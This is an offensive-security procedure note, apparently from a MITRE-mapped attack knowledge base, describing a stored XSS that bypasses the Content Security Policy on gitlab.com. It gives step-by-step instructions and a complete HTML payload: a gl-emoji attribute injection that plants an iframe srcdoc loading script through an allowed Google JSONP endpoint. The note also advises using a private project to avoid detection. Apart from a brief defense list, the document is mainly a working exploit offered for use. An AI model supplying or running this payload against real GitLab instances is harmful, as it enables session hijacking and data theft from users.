---
tags:
  - csp-bypass
  - xss
  - gitlab-saas
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Disable or Modify Tools]]'
updated_at: '2025-12-13T23:52:34.040Z'
skill_level: advanced
impact_level: high
detection_risk: medium
sub_techniques: []
id: f5210da4-b656-4116-8394-d544a239a8f2
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Disable or Modify Tools]]'
---
# Bypass-CSP-in-GitLab-SaaS-with-Iframe-Payload

## Summary

This procedure extends the stored XSS to GitLab SaaS (gitlab.com) by using an iframe srcdoc payload to load external scripts, evading CSP restrictions on script sources.

## Description

GitLab SaaS enforces CSP blocking direct external JS, but the payload injects an iframe via gl-emoji data-name, with srcdoc containing a script tag sourcing from apis.google.com (allowed domain). This chains with the base XSS, executing in private projects where visibility limits exposure. It requires a private project to avoid public detection.

## Requirements

1. GitLab.com account with private project creation rights
2. Access to issue comments in SaaS
3. Understanding of CSP policies (e.g., allowed Google APIs)

## Defense

Defensive measures and detection strategies:

- Strengthen CSP to disallow unsafe-inline and frame-srcdoc
- Block or monitor Google API calls from comment renders
- Review private project activities for suspicious payloads

## Objectives

1. Inject CSP-evading payload in SaaS comments
2. Load and execute external JS via iframe
3. Confirm SaaS exploitability for broader impact

## Instructions

### Step 1: Create Private Project and Issue

**Context**: Set up isolated environment on gitlab.com.

**Command** (UI action):

Log in to gitlab.com, create a new private project, then new issue.

> Ensures limited visibility; open comment field.

### Step 2: Inject CSP Bypass Payload

**Context**: Use iframe srcdoc to load allowed external resource.

**Command** (UI action with payload):

Paste into comment:

```html
<pre data-sourcepos=""></pre><gl-emoji data-name='\"x=\"y\"<iframe srcdoc=\"<script src=https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout></script>\"' data-unicode-version='x'>abc</gl-emoji><pre x=\""><code></code></pre>
```
Submit.

> Payload stores; iframe renders on view.

### Step 3: Trigger and Verify

**Context**: Load page to execute via srcdoc script.

**Command** (UI action):

View the issue; check for alert(document.domain).

> Alert shows 'gitlab.com'; no CSP blocks.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]
- [[Disable or Modify Tools]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- csp-bypass
- xss
- gitlab-saas
